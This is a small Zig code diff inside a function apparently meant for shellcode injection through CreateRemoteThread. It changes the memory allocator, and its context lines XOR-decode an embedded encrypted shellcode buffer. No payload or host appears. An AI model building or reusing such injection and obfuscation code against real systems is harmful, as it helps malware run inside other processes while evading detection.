@@ -12,9 +12,7 @@ pub fn createRemoteThreadShellocode(
 ) anyerror!void {
     var processHandle: ?win.HANDLE = undefined;
     var tmp: [1024]u8 = undefined;
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    defer _ = gpa.deinit();
-    const allocator = gpa.allocator();
+    const allocator = std.heap.smp_allocator;
 
     const shellcode = try lib.xorSingleBytes(allocator, &cipherShellcode, 'a');
     logger.debug("Shellcode (len: {d}):", .{shellcode.len});
